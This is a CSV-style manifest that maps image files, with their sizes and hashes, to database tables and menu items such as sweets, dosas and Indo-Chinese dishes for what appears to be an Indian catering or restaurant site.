262.jpg,notforgittrack/the-famous-halwai-images/images/262.jpg,16209,a38d24dd1d9ca17528d28da97dd3dbbe5b0f2e49e4b89c415d16659c5a605643,12e49a9d4bfefa4c4a23e58f40e9be22,DB Mapped (Verified),menu_item_tbl,262,Badam Halwa,menu_img
262.jpg,notforgittrack/the-famous-halwai-images/images/262.jpg,16209,a38d24dd1d9ca17528d28da97dd3dbbe5b0f2e49e4b89c415d16659c5a605643,12e49a9d4bfefa4c4a23e58f40e9be22,DB Mapped (Verified),menu_item_tbl,262,Badam Halwa,menu_small_img
263.jpeg,notforgittrack/the-famous-halwai-images/images/263.jpeg,9504,be2e0e0bcc2d6f347933d3a7d5290c6cb7f83ac48391b95e262382ab512853d7,0bc8c08f89b1eae52ee9e37cb20646b4,DB Mapped (Verified),menu_item_tbl,263,Moong Ka Halwa,menu_img
263.jpeg,notforgittrack/the-famous-halwai-images/images/263.jpeg,9504,be2e0e0bcc2d6f347933d3a7d5290c6cb7f83ac48391b95e262382ab512853d7,0bc8c08f89b1eae52ee9e37cb20646b4,DB Mapped (Verified),menu_item_tbl,263,Moong Ka Halwa,menu_small_img
264.jpeg,notforgittrack/the-famous-halwai-images/images/264.jpeg,57681,f3e3f612e2fd801601852f90e098fc72df013693e8fde1fc5b7a3d49f4807a01,f600680443c8de77433c2bf9e4b9ac3c,DB Mapped (Verified),menu_item_tbl,264,Jalebi,menu_img
264.jpeg,notforgittrack/the-famous-halwai-images/images/264.jpeg,57681,f3e3f612e2fd801601852f90e098fc72df013693e8fde1fc5b7a3d49f4807a01,f600680443c8de77433c2bf9e4b9ac3c,DB Mapped (Verified),menu_item_tbl,264,Jalebi,menu_small_img
265.jpeg,notforgittrack/the-famous-halwai-images/images/265.jpeg,5750,71035c06ed1372308ff8d836180f0e830f3e24241eb990d942a0e6bb324a0dbe,02151053cf8e862a1d054c7579ef0fe8,DB Mapped (Verified),menu_item_tbl,265,Kesar Imarti,menu_img
265.jpeg,notforgittrack/the-famous-halwai-images/images/265.jpeg,5750,71035c06ed1372308ff8d836180f0e830f3e24241eb990d942a0e6bb324a0dbe,02151053cf8e862a1d054c7579ef0fe8,DB Mapped (Verified),menu_item_tbl,265,Kesar Imarti,menu_small_img
266.jpg,notforgittrack/the-famous-halwai-images/images/266.jpg,12426,4b18dfa1b8da490b35b09898ab0bd1c2382f13d67b71c01249c6409841df33f7,263ff380ff93fffc9de61cc92d3230be,DB Mapped (Verified),menu_item_tbl,266,Pista Badam Kheer,menu_img
266.jpg,notforgittrack/the-famous-halwai-images/images/266.jpg,12426,4b18dfa1b8da490b35b09898ab0bd1c2382f13d67b71c01249c6409841df33f7,263ff380ff93fffc9de61cc92d3230be,DB Mapped (Verified),menu_item_tbl,266,Pista Badam Kheer,menu_small_img
267.jpeg,notforgittrack/the-famous-halwai-images/images/267.jpeg,7277,d3bceef023ae713cf6dc1f695fddb3ae10e15ba8ef03954c44fc52ddcd429124,954f033de121739d4f163a8366837982,DB Mapped (Verified),menu_item_tbl,267,Badam Dal Halwa,menu_img
267.jpeg,notforgittrack/the-famous-halwai-images/images/267.jpeg,7277,d3bceef023ae713cf6dc1f695fddb3ae10e15ba8ef03954c44fc52ddcd429124,954f033de121739d4f163a8366837982,DB Mapped (Verified),menu_item_tbl,267,Badam Dal Halwa,menu_small_img
268.jpg,notforgittrack/the-famous-halwai-images/images/268.jpg,16465,57771840d653cac16977731cdf50f6f3dfd81b88a47ecf83611c71d666c05bac,19f9a414af9e6b3d8c5e923c6056cc96,DB Mapped (Verified),menu_item_tbl,268,Suji Halwa,menu_img
268.jpg,notforgittrack/the-famous-halwai-images/images/268.jpg,16465,57771840d653cac16977731cdf50f6f3dfd81b88a47ecf83611c71d666c05bac,19f9a414af9e6b3d8c5e923c6056cc96,DB Mapped (Verified),menu_item_tbl,268,Suji Halwa,menu_small_img
269.jpeg,notforgittrack/the-famous-halwai-images/images/269.jpeg,12201,7b15c93b4bb00d57eb1fd209440ad9789bf1cbd09dba807fb34dc63c0b6a931c,4607d17a96bf901d6bc2634d4c564bab,DB Mapped (Verified),menu_item_tbl,269,Gajar Halwa,menu_img
269.jpeg,notforgittrack/the-famous-halwai-images/images/269.jpeg,12201,7b15c93b4bb00d57eb1fd209440ad9789bf1cbd09dba807fb34dc63c0b6a931c,4607d17a96bf901d6bc2634d4c564bab,DB Mapped (Verified),menu_item_tbl,269,Gajar Halwa,menu_small_img
27.jpg,notforgittrack/the-famous-halwai-images/images/27.jpg,24536,c6776aa3311b50e75a0abdb2ff0c360865cb022c70ae4c938972fb2ec8aedc5a,0e98553f1c8e9925efd2eee99e5c27de,DB Mapped (Verified),menu_item_tbl,27,Chicken Manchow Soup,menu_img
27.jpg,notforgittrack/the-famous-halwai-images/images/27.jpg,24536,c6776aa3311b50e75a0abdb2ff0c360865cb022c70ae4c938972fb2ec8aedc5a,0e98553f1c8e9925efd2eee99e5c27de,DB Mapped (Verified),menu_item_tbl,27,Chicken Manchow Soup,menu_small_img
27.jpg,notforgittrack/the-famous-halwai-images/images/27.jpg,24536,c6776aa3311b50e75a0abdb2ff0c360865cb022c70ae4c938972fb2ec8aedc5a,0e98553f1c8e9925efd2eee99e5c27de,DB Mapped (Verified),product_item_tbl,27,Chilli Mix Pickle,menu_img
27.jpg,notforgittrack/the-famous-halwai-images/images/27.jpg,24536,c6776aa3311b50e75a0abdb2ff0c360865cb022c70ae4c938972fb2ec8aedc5a,0e98553f1c8e9925efd2eee99e5c27de,DB Mapped (Verified),worke_work_experience,27,north indian,workproimg
270.jpg,notforgittrack/the-famous-halwai-images/images/270.jpg,14237,ae8dde584034e3f00b68a4d51dee98d369a2fe51acc2e99a04bbbce2d38e64dc,bcee225b3e6eaddfef28156c1087d50d,DB Mapped (Verified),menu_item_tbl,270,Rasgulla,menu_img
270.jpg,notforgittrack/the-famous-halwai-images/images/270.jpg,14237,ae8dde584034e3f00b68a4d51dee98d369a2fe51acc2e99a04bbbce2d38e64dc,bcee225b3e6eaddfef28156c1087d50d,DB Mapped (Verified),menu_item_tbl,270,Rasgulla,menu_small_img
271.jpg,notforgittrack/the-famous-halwai-images/images/271.jpg,10716,45e91ccc59e94c0785ddb855f61e3631d1e998261af7830d1ab5c093beaf6e7f,8a43c7c5159b3d3a3a64c4c6ef815053,DB Mapped (Verified),menu_item_tbl,271,Rajbhog,menu_img
271.jpg,notforgittrack/the-famous-halwai-images/images/271.jpg,10716,45e91ccc59e94c0785ddb855f61e3631d1e998261af7830d1ab5c093beaf6e7f,8a43c7c5159b3d3a3a64c4c6ef815053,DB Mapped (Verified),menu_item_tbl,271,Rajbhog,menu_small_img
272.jpg,notforgittrack/the-famous-halwai-images/images/272.jpg,27233,f9f87c854f23eb5ed4d2aea4ed2156f58cca13bae60c130bbc280f57433aad20,798065329e46d448e8f937acd8a50659,DB Mapped (Verified),menu_item_tbl,272,Cham Cham,menu_img
272.jpg,notforgittrack/the-famous-halwai-images/images/272.jpg,27233,f9f87c854f23eb5ed4d2aea4ed2156f58cca13bae60c130bbc280f57433aad20,798065329e46d448e8f937acd8a50659,DB Mapped (Verified),menu_item_tbl,272,Cham Cham,menu_small_img
273.jpg,notforgittrack/the-famous-halwai-images/images/273.jpg,9250,6be28241840730685ba2187620851c1732a499600857ef0f1182f3de8d47dc9a,dc0e25fc03784744684c08efdde8b1ab,DB Mapped (Verified),menu_item_tbl,273,Rasmalai,menu_img
273.jpg,notforgittrack/the-famous-halwai-images/images/273.jpg,9250,6be28241840730685ba2187620851c1732a499600857ef0f1182f3de8d47dc9a,dc0e25fc03784744684c08efdde8b1ab,DB Mapped (Verified),menu_item_tbl,273,Rasmalai,menu_small_img
274.jpg,notforgittrack/the-famous-halwai-images/images/274.jpg,9667,e091094797b33f37945d7936c9089640d0a9fdffe943e13499575bfc56b0c38d,610111ee293d4b095edceaab2e5c02ab,DB Mapped (Verified),menu_item_tbl,274,Rabdi,menu_img
274.jpg,notforgittrack/the-famous-halwai-images/images/274.jpg,9667,e091094797b33f37945d7936c9089640d0a9fdffe943e13499575bfc56b0c38d,610111ee293d4b095edceaab2e5c02ab,DB Mapped (Verified),menu_item_tbl,274,Rabdi,menu_small_img
275.jpg,notforgittrack/the-famous-halwai-images/images/275.jpg,103146,fb74e7efd56584b98586e56c823251fd01287c3d9854144b9ab576abd2e47612,c4cddcd32d968535a16e48214c164654,DB Mapped (Verified),menu_item_tbl,275,Ice-Cream-Regular (Vanila/Strawberry/Papular Pista)/Butter Scotch/Chocolate/Kesar Pista/ Black Current/Tuti Fruit/Pineapple),menu_img
275.jpg,notforgittrack/the-famous-halwai-images/images/275.jpg,103146,fb74e7efd56584b98586e56c823251fd01287c3d9854144b9ab576abd2e47612,c4cddcd32d968535a16e48214c164654,DB Mapped (Verified),menu_item_tbl,275,Ice-Cream-Regular (Vanila/Strawberry/Papular Pista)/Butter Scotch/Chocolate/Kesar Pista/ Black Current/Tuti Fruit/Pineapple),menu_small_img
276.jpg,notforgittrack/the-famous-halwai-images/images/276.jpg,15125,1be541e27f779137dc18e6d43fc2fddedd1782367713233a1d0da21c35a3f9e3,c2b751d3af89c008bf9e7a63ab3362b2,DB Mapped (Verified),menu_item_tbl,276,Rabdi Falooda,menu_img
276.jpg,notforgittrack/the-famous-halwai-images/images/276.jpg,15125,1be541e27f779137dc18e6d43fc2fddedd1782367713233a1d0da21c35a3f9e3,c2b751d3af89c008bf9e7a63ab3362b2,DB Mapped (Verified),menu_item_tbl,276,Rabdi Falooda,menu_small_img
277.jpg,notforgittrack/the-famous-halwai-images/images/277.jpg,12123,b11a02291b69026b9b4a6261bdc553409f4c834503f8ec7b48082198c900772f,68876710b674d9b4fcc4e43b59faa780,DB Mapped (Verified),menu_item_tbl,277,Plain cream Kulfi,menu_img
277.jpg,notforgittrack/the-famous-halwai-images/images/277.jpg,12123,b11a02291b69026b9b4a6261bdc553409f4c834503f8ec7b48082198c900772f,68876710b674d9b4fcc4e43b59faa780,DB Mapped (Verified),menu_item_tbl,277,Plain cream Kulfi,menu_small_img
278.jpeg,notforgittrack/the-famous-halwai-images/images/278.jpeg,6960,266b40b8b1ed8355fb4825e3196a4ad3a2ecbe0251b362afe9c236f49f4c3b70,50ca5946e1b80d9bc19f964baa39332d,DB Mapped (Verified),menu_item_tbl,278,Rabri Kulfi,menu_img
278.jpeg,notforgittrack/the-famous-halwai-images/images/278.jpeg,6960,266b40b8b1ed8355fb4825e3196a4ad3a2ecbe0251b362afe9c236f49f4c3b70,50ca5946e1b80d9bc19f964baa39332d,DB Mapped (Verified),menu_item_tbl,278,Rabri Kulfi,menu_small_img
279.jpeg,notforgittrack/the-famous-halwai-images/images/279.jpeg,5669,3fd3d0266d987c62f8c42fa0ceeb004ef998e054061ff3cb1291797e16d04542,16c54fdebd4efe3f7d887a9abe4792a9,DB Mapped (Verified),menu_item_tbl,279,Kesar Kulfi,menu_img
279.jpeg,notforgittrack/the-famous-halwai-images/images/279.jpeg,5669,3fd3d0266d987c62f8c42fa0ceeb004ef998e054061ff3cb1291797e16d04542,16c54fdebd4efe3f7d887a9abe4792a9,DB Mapped (Verified),menu_item_tbl,279,Kesar Kulfi,menu_small_img
28.jpeg,notforgittrack/the-famous-halwai-images/images/28.jpeg,141408,d1bfdd60fe562ab3d9b6ba27517796b58665f812d2f9e448ed53b309efcdd089,dd322aa05d126ff7bc12230b5f4e0936,DB Mapped (Verified),menu_item_tbl,28,Mutton Shorba,menu_img
28.jpeg,notforgittrack/the-famous-halwai-images/images/28.jpeg,141408,d1bfdd60fe562ab3d9b6ba27517796b58665f812d2f9e448ed53b309efcdd089,dd322aa05d126ff7bc12230b5f4e0936,DB Mapped (Verified),menu_item_tbl,28,Mutton Shorba,menu_small_img
280.jpeg,notforgittrack/the-famous-halwai-images/images/280.jpeg,29532,57ac2bf6031476ac618948c5a3cd8bed65704381f5bbab78708823a6e13df3b1,b3a9e4af789bb658f3db9acf9b621214,DB Mapped (Verified),menu_item_tbl,280,Masala Dosa,menu_img
281.jpeg,notforgittrack/the-famous-halwai-images/images/281.jpeg,6457,3001ae646e632e5914c23fe953b16fed26fdbab48de4e87bb5d044c481216e85,a92dacfda5c758ad2c9a0f3f92b8d132,DB Mapped (Verified),menu_item_tbl,281,Plain Dosa,menu_img
282.jpeg,notforgittrack/the-famous-halwai-images/images/282.jpeg,9096,9afeead6eec0cb81ba293430e8f3d435ffe201862d177d5316d98034ed29cff5,4d645c54313c5463298019a7a89a9ad6,DB Mapped (Verified),menu_item_tbl,282,Butter Masala Dosa,menu_img
283.jpg,notforgittrack/the-famous-halwai-images/images/283.jpg,96688,de13a750d3703f64f06b4a009c7b034213101a68c500ca1806eb18ab5bab0b3f,d054f338341f4fe7cb4310558433eb27,DB Mapped (Verified),menu_item_tbl,283,Paper Dosa,menu_img
284.jpeg,notforgittrack/the-famous-halwai-images/images/284.jpeg,8087,8677db934f26fa0d3aa498f4560058b68c2eafe868c98648fb540444e148d866,3632ac394aa4ef83ca825ecedda1169c,DB Mapped (Verified),menu_item_tbl,284,Paper Masala Dosa,menu_img
285.jpg,notforgittrack/the-famous-halwai-images/images/285.jpg,250766,e72711dcb4e99e47ce845dd88855742ddbdb848215dd5dfe3274a34939050755,d068851cc5d7f4e6d2c129bda384e025,DB Mapped (Verified),menu_item_tbl,285,Rawa Dosa,menu_img
286.jpg,notforgittrack/the-famous-halwai-images/images/286.jpg,59197,f9d81703b0dbe68bc328d97d8916f9664ca726a9c983fe57cede9089688c60ca,9df99bda86dd4ec2fbb71192d8834fe2,DB Mapped (Verified),menu_item_tbl,286,Rawa Vegetable Dosa,menu_img
287.jpg,notforgittrack/the-famous-halwai-images/images/287.jpg,58958,aaa44c9025a551c55700b8701303af4fe274e836969e4663bf7c01c5cf2aeba6,b7e3c15ce581d9e90d2a29079ce172f7,DB Mapped (Verified),menu_item_tbl,287,Tomato Uthapam,menu_img
288.jpeg,notforgittrack/the-famous-halwai-images/images/288.jpeg,12144,416004634e81d74f7dc455c225f30ba499c5bde7776072546fbd5302de7d9096,bb9dd0e5aacf1fb5e9d01fa8b1612c5a,DB Mapped (Verified),menu_item_tbl,288,Mix Vegetable Uthapam,menu_img
289.jpeg,notforgittrack/the-famous-halwai-images/images/289.jpeg,6195,107324934ea4301778f91bbe04cef42084be307d210bc1e0fbe006878dce1e4f,1b6a347ac5fc8cf1089de37b5d00e3fa,DB Mapped (Verified),menu_item_tbl,289,Idly Sambar,menu_img
29.jpeg,notforgittrack/the-famous-halwai-images/images/29.jpeg,78689,1a0d1180e82403626ad1605de89d469f7b2b6c5c67ad862a6ded48b747175744,de34c77f69766f940a51c0538ab448c0,DB Mapped (Verified),menu_item_tbl,29,Upma,menu_img
290.jpeg,notforgittrack/the-famous-halwai-images/images/290.jpeg,7746,fd01952b86f6f947f31978b0068f25726bc7e671bcdc2a2527b053883658d634,ecd450998f01563d797c6f631d6b94b8,DB Mapped (Verified),menu_item_tbl,290,Upma,menu_img
291.jpeg,notforgittrack/the-famous-halwai-images/images/291.jpeg,7263,96f00e2a308fb7ff9b5ab56458cd59def2115e1043cb54f7e52caeb891a4721e,961e63dfac94281f40f61a8ae83b3db6,DB Mapped (Verified),menu_item_tbl,291,Coconut Chutney,menu_img
292.jpeg,notforgittrack/the-famous-halwai-images/images/292.jpeg,9136,a7ea70402a5109ce0a2a99492d51bffb08e350d95ca1413723fd0ce92d347efa,7a9efdca810ec9cfe2885fe2d61a03db,DB Mapped (Verified),menu_item_tbl,292,Veg Spring Roll - China,menu_img
292.jpeg,notforgittrack/the-famous-halwai-images/images/292.jpeg,9136,a7ea70402a5109ce0a2a99492d51bffb08e350d95ca1413723fd0ce92d347efa,7a9efdca810ec9cfe2885fe2d61a03db,DB Mapped (Verified),menu_item_tbl,292,Veg Spring Roll - China,menu_small_img
293.jpeg,notforgittrack/the-famous-halwai-images/images/293.jpeg,10180,da630612ef709d0caa4c92714eb1881fb13d349512aa5322aac4876f68a528af,0796a7781c25cb30911f34ecf31d7ff5,DB Mapped (Verified),menu_item_tbl,293,Veg Wonton - China,menu_img
294.jpeg,notforgittrack/the-famous-halwai-images/images/294.jpeg,7599,32d448e5a66ecd0ef1e38b6a52aef640ebaa9af59704548b149cd8416d4713c0,94ac8b65411c132658addb811e26749d,DB Mapped (Verified),menu_item_tbl,294,Veg Dimsum - China,menu_img
294.jpeg,notforgittrack/the-famous-halwai-images/images/294.jpeg,7599,32d448e5a66ecd0ef1e38b6a52aef640ebaa9af59704548b149cd8416d4713c0,94ac8b65411c132658addb811e26749d,DB Mapped (Verified),menu_item_tbl,294,Veg Dimsum - China,menu_small_img
295.jpeg,notforgittrack/the-famous-halwai-images/images/295.jpeg,10720,8f16ca24fb37d553d2ecc41a6c59e1760dfa235b45c6207a9f3fd12421125714,9f6266b7ff50bf4d86a16c8dbceff07e,DB Mapped (Verified),menu_item_tbl,295,Chilli Gobi - China,menu_img
295.jpeg,notforgittrack/the-famous-halwai-images/images/295.jpeg,10720,8f16ca24fb37d553d2ecc41a6c59e1760dfa235b45c6207a9f3fd12421125714,9f6266b7ff50bf4d86a16c8dbceff07e,DB Mapped (Verified),menu_item_tbl,295,Chilli Gobi - China,menu_small_img
296.jpg,notforgittrack/the-famous-halwai-images/images/296.jpg,66595,7c18ab6344c6de8d518e171e1d5cebc936f2962bcd72303ac42c5bcebe47689e,abd78c92044239bab02f9f7b4f6d283c,DB Mapped (Verified),menu_item_tbl,296,Chinese Samosa - China,menu_img
296.jpg,notforgittrack/the-famous-halwai-images/images/296.jpg,66595,7c18ab6344c6de8d518e171e1d5cebc936f2962bcd72303ac42c5bcebe47689e,abd78c92044239bab02f9f7b4f6d283c,DB Mapped (Verified),menu_item_tbl,296,Chinese Samosa - China,menu_small_img
297.jpg,notforgittrack/the-famous-halwai-images/images/297.jpg,18462,74a934d89de3398c9c61a35a73c477136a664ce0c3ebbab05cc15cdc0f151b1b,5929876a3bbb4d1d66971b9f43388a11,DB Mapped (Verified),menu_item_tbl,297,Fried Rice/Ginger Fried Rice - China,menu_img
297.jpg,notforgittrack/the-famous-halwai-images/images/297.jpg,18462,74a934d89de3398c9c61a35a73c477136a664ce0c3ebbab05cc15cdc0f151b1b,5929876a3bbb4d1d66971b9f43388a11,DB Mapped (Verified),menu_item_tbl,297,Fried Rice/Ginger Fried Rice - China,menu_small_img
298.jpeg,notforgittrack/the-famous-halwai-images/images/298.jpeg,9742,259f750ca12725818f118beb214fb17a21abddf7f5e42e3951c2a69f0c57d1a5,9b35cd71ac9e3be8966379f95b52a68b,DB Mapped (Verified),menu_item_tbl,298,Chilli Paneer - China,menu_img
298.jpeg,notforgittrack/the-famous-halwai-images/images/298.jpeg,9742,259f750ca12725818f118beb214fb17a21abddf7f5e42e3951c2a69f0c57d1a5,9b35cd71ac9e3be8966379f95b52a68b,DB Mapped (Verified),menu_item_tbl,298,Chilli Paneer - China,menu_small_img
299.jpg,notforgittrack/the-famous-halwai-images/images/299.jpg,17205,7769b79a267f1ba3374fbade5ffb79fd1be9e15a74227db93f5ee359b0a2a130,8816b95f2627cdb06031cdb9fd21d388,DB Mapped (Verified),menu_item_tbl,299,Veg. Fried Dimsum - China,menu_img
299.jpg,notforgittrack/the-famous-halwai-images/images/299.jpg,17205,7769b79a267f1ba3374fbade5ffb79fd1be9e15a74227db93f5ee359b0a2a130,8816b95f2627cdb06031cdb9fd21d388,DB Mapped (Verified),menu_item_tbl,299,Veg. Fried Dimsum - China,menu_small_img
3.jpg,notforgittrack/the-famous-halwai-images/images/3.jpg,125144,f9c3d52a72cb5b472536b18bf55ac97c92b9ffe2ae1b895f96b34edf5cebaab2,bd2f448c26d20d9b830ec7cbdfc2e068,DB Mapped (Verified),menu_item_tbl,3,Mixed Veg Uttappam,menu_img
3.jpg,notforgittrack/the-famous-halwai-images/images/3.jpg,125144,f9c3d52a72cb5b472536b18bf55ac97c92b9ffe2ae1b895f96b34edf5cebaab2,bd2f448c26d20d9b830ec7cbdfc2e068,DB Mapped (Verified),product_item_tbl,3,Loose Gol Matthi,menu_img
3.jpg,notforgittrack/the-famous-halwai-images/images/3.jpg,125144,f9c3d52a72cb5b472536b18bf55ac97c92b9ffe2ae1b895f96b34edf5cebaab2,bd2f448c26d20d9b830ec7cbdfc2e068,DB Mapped (Verified),website_gallery,3,Images 3,gimage
3.jpg,notforgittrack/the-famous-halwai-images/images/3.jpg,125144,f9c3d52a72cb5b472536b18bf55ac97c92b9ffe2ae1b895f96b34edf5cebaab2,bd2f448c26d20d9b830ec7cbdfc2e068,DB Mapped (Verified),recipe_appliances_kits,3,Refined Oil,kits_img
3.jpg,notforgittrack/the-famous-halwai-images/images/3.jpg,125144,f9c3d52a72cb5b472536b18bf55ac97c92b9ffe2ae1b895f96b34edf5cebaab2,bd2f448c26d20d9b830ec7cbdfc2e068,DB Mapped (Verified),event_cuisine,3,China to India,cuisine_img
30.jpeg,notforgittrack/the-famous-halwai-images/images/30.jpeg,12330,6ba1bd163b76baea92af52a28697fd9782fa73834188dcde57bd44d177eeda6d,1ea0f9bcab70d3c623f0f5973262e175,DB Mapped (Verified),menu_item_tbl,30,Mix Pakode,menu_img
300.jpg,notforgittrack/the-famous-halwai-images/images/300.jpg,12536,8a39090f5aae720324c9194b4db4fa5a24a3ab1e68a5e2e8e83272ae285b3f16,8f438b67041d7cf790b421eceb87150a,DB Mapped (Verified),menu_item_tbl,300,Veg. Manchurian Dry - China,menu_img
300.jpg,notforgittrack/the-famous-halwai-images/images/300.jpg,12536,8a39090f5aae720324c9194b4db4fa5a24a3ab1e68a5e2e8e83272ae285b3f16,8f438b67041d7cf790b421eceb87150a,DB Mapped (Verified),menu_item_tbl,300,Veg. Manchurian Dry - China,menu_small_img
301.jpg,notforgittrack/the-famous-halwai-images/images/301.jpg,74120,5727977e280e12add13d6acd42782f77cee5fad8a335910c84152362cbd7349d,e54b05877e9c2aa6437cd37a3ddd7276,DB Mapped (Verified),menu_item_tbl,301,Sweet & Sour Soup,menu_img
301.jpg,notforgittrack/the-famous-halwai-images/images/301.jpg,74120,5727977e280e12add13d6acd42782f77cee5fad8a335910c84152362cbd7349d,e54b05877e9c2aa6437cd37a3ddd7276,DB Mapped (Verified),menu_item_tbl,301,Sweet & Sour Soup,menu_small_img
302.jpeg,notforgittrack/the-famous-halwai-images/images/302.jpeg,26491,194843a8d7d8f8c975d0a73bc70b07b6bb0c363f0c4a6bb19332342dbb74bc2e,c1c6d3022f1bc40ec087c5252611c9de,DB Mapped (Verified),menu_item_tbl,302,Hot  & Sour Soup,menu_img
302.jpeg,notforgittrack/the-famous-halwai-images/images/302.jpeg,26491,194843a8d7d8f8c975d0a73bc70b07b6bb0c363f0c4a6bb19332342dbb74bc2e,c1c6d3022f1bc40ec087c5252611c9de,DB Mapped (Verified),menu_item_tbl,302,Hot  & Sour Soup,menu_small_img
303.jpg,notforgittrack/the-famous-halwai-images/images/303.jpg,21472,76ca35a37d669f7487bb713482e6c7261d46167184ea87f0ee464d4cc2eea1a0,4a3b0fb6467763de7c5672dc73a03507,DB Mapped (Verified),menu_item_tbl,303,Veg. Wonton Soup - Chinese,menu_img
303.jpg,notforgittrack/the-famous-halwai-images/images/303.jpg,21472,76ca35a37d669f7487bb713482e6c7261d46167184ea87f0ee464d4cc2eea1a0,4a3b0fb6467763de7c5672dc73a03507,DB Mapped (Verified),menu_item_tbl,303,Veg. Wonton Soup - Chinese,menu_small_img
305.jpg,notforgittrack/the-famous-halwai-images/images/305.jpg,23019,c3599e93e2bcd75e52beff3fe236800758566525fd505958460153920a7cd672,e64f5841d8bbc70617ec92b5dfd72d60,DB Mapped (Verified),menu_item_tbl,305,Cucumber Cantonnese - China,menu_img
305.jpg,notforgittrack/the-famous-halwai-images/images/305.jpg,23019,c3599e93e2bcd75e52beff3fe236800758566525fd505958460153920a7cd672,e64f5841d8bbc70617ec92b5dfd72d60,DB Mapped (Verified),menu_item_tbl,305,Cucumber Cantonnese - China,menu_small_img
306.jpeg,notforgittrack/the-famous-halwai-images/images/306.jpeg,12668,7a868eeea73395f480fcfca0a9d83df54e7ad1364d53e75aef043391d38f75da,edd12741b622bd7a8d5184ab82e0b85c,DB Mapped (Verified),menu_item_tbl,306,Mix Veg.With Brocoli - Chinese,menu_img
307.jpeg,notforgittrack/the-famous-halwai-images/images/307.jpeg,8291,cdd220ea91e6bb8d34606205db3eef349e575cd3ea9ce53b2c9374e852b5e17e,8bd93bb1f86f34a01a22075c40a5a559,DB Mapped (Verified),menu_item_tbl,307,Salt & Pepper Vegetable - Chinese,menu_img
308.jpg,notforgittrack/the-famous-halwai-images/images/308.jpg,146147,13cc46f17caf97cb988c5ba18a18808737b30d15179a11e51f3ac15ab65271e4,79bf5a7c41ee139dd8203f571c392eff,DB Mapped (Verified),menu_item_tbl,308,Vegetable Manchurian - Chinese,menu_img
309.jpg,notforgittrack/the-famous-halwai-images/images/309.jpg,103778,048de34266694795e18258f5b932a400962f25e74d0ca69982ee3b48f423afdc,a543ae4aba2319e3c3ced8d8f0787350,DB Mapped (Verified),menu_item_tbl,309,Hakka Nodles - Chinese,menu_img
31.jpg,notforgittrack/the-famous-halwai-images/images/31.jpg,266894,c8fbc93942b033f1e86a902f46d6efc2e1d8a36ad98e2277cc0a9e24cc7d1681,9561df2274fa4f5b483a56b9bb699a4b,DB Mapped (Verified),menu_item_tbl,31,Fruits,menu_img
31.jpg,notforgittrack/the-famous-halwai-images/images/31.jpg,266894,c8fbc93942b033f1e86a902f46d6efc2e1d8a36ad98e2277cc0a9e24cc7d1681,9561df2274fa4f5b483a56b9bb699a4b,DB Mapped (Verified),product_item_tbl,31,Coriander Coconut Chutney,menu_img
310.jpg,notforgittrack/the-famous-halwai-images/images/310.jpg,46926,a4eaf6e5f8764c982e93a109f639ff3c5b6441eb8234adeffda9206d9a55ea29,7c19dd25d5482147b62d7148d7aa3470,DB Mapped (Verified),menu_item_tbl,310,Chowmein - Chinese,menu_img
311.webp,notforgittrack/the-famous-halwai-images/images/311.webp,31996,d4a74d57a8f932176044cb6a05face3adc178768e3af550fc5143e23209c295f,5abc2991434d82456f7dcf7494415afa,DB Mapped (Verified),menu_item_tbl,311,Noodles - Chinese,menu_img
312.jpg,notforgittrack/the-famous-halwai-images/images/312.jpg,222532,ee1e7f6823f12c3c8212744bd77a594da98ea82c0bd0c737ca675ac936910a60,7da9d93f2f6bb6e789b36c96ea3403aa,DB Mapped (Verified),menu_item_tbl,312,Vegetable Hakka Noodles - Chinese,menu_img
313.jpeg,notforgittrack/the-famous-halwai-images/images/313.jpeg,12293,4729b8e69a8b34abe0cb67404c16f2d4e54a2384020406d17d3236878fc58739,1b2d70f5495a45a3eaa3f8a35f34fd67,DB Mapped (Verified),menu_item_tbl,313,Vegetable Fried Rice - Chinese,menu_img
314.jpeg,notforgittrack/the-famous-halwai-images/images/314.jpeg,13165,2509f6337f0c257864dc25588b9b844a73b9abd40efa2a3622fb6cee1b1c569a,3eb7091fc906091ed3e3d615152aa5f3,DB Mapped (Verified),menu_item_tbl,314,Hongkong Style - Chinese,menu_img
315.jpg,notforgittrack/the-famous-halwai-images/images/315.jpg,15049,85ca56fbf71861029984d701354d4559fee17d82eebefbd1cc8a6505bdc5eb42,cc7cbdfde778e34c6f8c56763ba6a1da,DB Mapped (Verified),menu_item_tbl,315,Jhangora Ki Kheer,menu_img
315.jpg,notforgittrack/the-famous-halwai-images/images/315.jpg,15049,85ca56fbf71861029984d701354d4559fee17d82eebefbd1cc8a6505bdc5eb42,cc7cbdfde778e34c6f8c56763ba6a1da,DB Mapped (Verified),menu_item_tbl,315,Jhangora Ki Kheer,menu_small_img
316.jpg,notforgittrack/the-famous-halwai-images/images/316.jpg,78801,d3e5e53fd4b44cf70760db76ee699f9a44f73d6d52bad34103ffef3323a351ae,647e9fc160ac7056fe6873378331eff5,DB Mapped (Verified),menu_item_tbl,316,Gulgula,menu_img
316.jpg,notforgittrack/the-famous-halwai-images/images/316.jpg,78801,d3e5e53fd4b44cf70760db76ee699f9a44f73d6d52bad34103ffef3323a351ae,647e9fc160ac7056fe6873378331eff5,DB Mapped (Verified),menu_item_tbl,316,Gulgula,menu_small_img
317.jpeg,notforgittrack/the-famous-halwai-images/images/317.jpeg,10706,f430f7e757ba74fd9a0ccfce38a7da2f97215c4fd7359fd7e89c25aae82267c8,a0e0720d83d2d753685025cafe882741,DB Mapped (Verified),menu_item_tbl,317,Arsa,menu_img
317.jpeg,notforgittrack/the-famous-halwai-images/images/317.jpeg,10706,f430f7e757ba74fd9a0ccfce38a7da2f97215c4fd7359fd7e89c25aae82267c8,a0e0720d83d2d753685025cafe882741,DB Mapped (Verified),menu_item_tbl,317,Arsa,menu_small_img
318.jpg,notforgittrack/the-famous-halwai-images/images/318.jpg,9503,8c17f1a588b76d951ad1c3cd435e6f36177bc862662a99f81998c98d589a266b,d4af4cd4e89a85d140e1d52bc3c36855,DB Mapped (Verified),menu_item_tbl,318,Litti Chokha,menu_img
318.jpg,notforgittrack/the-famous-halwai-images/images/318.jpg,9503,8c17f1a588b76d951ad1c3cd435e6f36177bc862662a99f81998c98d589a266b,d4af4cd4e89a85d140e1d52bc3c36855,DB Mapped (Verified),menu_item_tbl,318,Litti Chokha,menu_small_img
319.jpg,notforgittrack/the-famous-halwai-images/images/319.jpg,51889,446392921d32a1ab25bbb70c2c3020ba52fe9934eab4c5a71e54607e5df34ffe,258b993b6b5a6722d5473c7281395c78,DB Mapped (Verified),menu_item_tbl,319,Naivedyam,menu_img
